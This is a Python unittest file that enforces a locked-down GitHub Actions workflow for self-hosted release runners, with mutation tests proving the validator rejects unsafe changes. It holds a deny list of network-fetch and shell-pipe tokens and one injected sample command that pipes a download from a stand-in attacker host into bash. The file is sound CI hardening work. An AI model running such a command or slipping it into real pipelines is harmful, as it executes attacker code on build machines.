"""Enforce the owner-authorized v0.0.1 runner test topology and runtime boundary."""
import unittest
from pathlib import Path
import yaml

ROOT = Path(__file__).resolve().parents[1]
PATH = ROOT / ".github/workflows/v0.0.1-runner-ci.yml"
CHECKOUT = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
BRANCH = "release/v0.0.1-cloud-only"
GUARD = (
    "github.repository == 'vixttha/Color-Team-OPS' && "
    "github.ref == 'refs/heads/release/v0.0.1-cloud-only'"
)


class StrictLoader(yaml.BaseLoader):
    def construct_mapping(self, node, deep=False):
        values = self.construct_pairs(node, deep=deep)
        result = {}
        for key, value in values:
            if key in result:
                raise ValueError("Duplicate YAML key: " + str(key))
            result[key] = value
        return result


def check_release_workflow(source):
    data = yaml.load(source, Loader=StrictLoader)
    assert isinstance(data, dict)
    assert set(data) == {"name", "on", "permissions", "jobs"}
    assert data["on"] == {"push": {"branches": [BRANCH]}}
    assert data["permissions"] == {"contents": "read"}
    assert set(data["jobs"]) == {"windows", "linux"}

    for name, labels, shell in [
        ("windows", ["self-hosted", "Windows", "X64", "color-team-ops"], "powershell"),
        ("linux", ["self-hosted", "Linux", "X64", "color-team-ops"], "bash"),
    ]:
        job = data["jobs"][name]
        assert set(job) == {"if", "runs-on", "timeout-minutes", "steps"}
        assert job["if"] == GUARD
        assert job["runs-on"] == labels
        assert job["timeout-minutes"] == "20"
        steps = job["steps"]
        assert len(steps) == (3 if name == "windows" else 5)
        assert steps[0] == {
            "name": "Checkout exact tested source",
            "uses": CHECKOUT,
            "with": {"persist-credentials": "false"},
        }
        step = steps[1]
        assert set(step) == {"name", "shell", "env", "run"}
        assert step["shell"] == shell
        assert step["env"] == {"EXPECTED_SHA": chr(36) + "{{ github.sha }}"}
        source_code = step["run"]
        assert "git rev-parse HEAD" in source_code
        assert "EXPECTED_SHA" in source_code
        assert "requirements-ci.txt" in source_code
        assert "python" in source_code
        assert "unittest discover -s tests" in source_code
        if name == "windows":
            assert ".cto-test-venv" in source_code
        else:
            assert "import jsonschema, yaml" in source_code
        assert "runner identity mismatch" in source_code.lower() or "RUNNER_NAME" in source_code
        for token in ("secrets.", "curl ", "wget ", "invoke-webrequest", "pull_request", "workflow_call", "| bash"):
            assert token not in source_code.lower()
        cleanup_index = 2 if name == "windows" else 4
        if name == "linux":
            package = steps[2]
            assert set(package) == {"name", "shell", "env", "run"}
            assert package["shell"] == "bash"
            assert package["env"] == {"EXPECTED_SHA": chr(36) + "{{ github.sha }}"}
            assert "git archive --format=zip" in package["run"]
            assert "cmp color-team-ops-v0.0.1.zip color-team-ops-v0.0.1-check.zip" in package["run"]
            assert "sha256sum" in package["run"]
            assert "git rev-parse HEAD" in package["run"]
            assert "plugin.json" in package["run"] and "schemas skills" in package["run"]
            upload = steps[3]
            assert upload == {
                "name": "Upload verified v0.0.1 package",
                "uses": "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
                "with": {
                    "name": "color-team-ops-v0.0.1-package",
                    "path": "color-team-ops-v0.0.1.zip",
                    "retention-days": "7",
                    "if-no-files-found": "error",
                },
            }
        cleanup = steps[cleanup_index]
        assert cleanup["if"] == "always()"
        assert cleanup["shell"] == shell
        assert set(cleanup) == {"name", "if", "shell", "run"}
        assert ".cto-test-venv" in cleanup["run"] or ".cto-test-deps" in cleanup["run"]
    return True


class WorkflowTests(unittest.TestCase):
    def test_owner_runner_ci_is_bounded_to_release_branch(self):
        self.assertTrue(check_release_workflow(PATH.read_text(encoding="utf-8")))

    def test_superseded_workflows_removed(self):
        self.assertFalse((ROOT / ".github/workflows/cloud-ci.yml").exists())
        self.assertFalse((ROOT / ".github/workflows/optional-self-hosted.yml").exists())

    def test_mutation_untrusted_pr_trigger(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "  push:", "  pull_request:\n  push:", 1)
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_wrong_branch(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "branches: [" + BRANCH + "]", "branches: [main]", 1)
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_remove_identity(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "if: " + GUARD, "if: true # " + GUARD)
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_switch_to_hosted(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "[self-hosted, Linux, X64, color-team-ops]", "ubuntu-24.04")
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_change_credentials(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "persist-credentials: false", "persist-credentials: true")
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_allow_more_jobs(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "jobs:\n", "jobs:\n  injected: {}\n", 1)
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_inject_command(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "python3 --version", "curl https://attacker.invalid/evil | bash\n          python3 --version")
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_widen_write_permissions(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "contents: read", "contents: write", 1)
        with self.assertRaises(AssertionError):
            check_release_workflow(text)

    def test_mutation_duplicate_yaml_key(self):
        text = PATH.read_text(encoding="utf-8").replace(
            "  push:", "  push:\n  push:", 1)
        with self.assertRaises(ValueError):
            check_release_workflow(text)


if __name__ == "__main__":
    unittest.main()
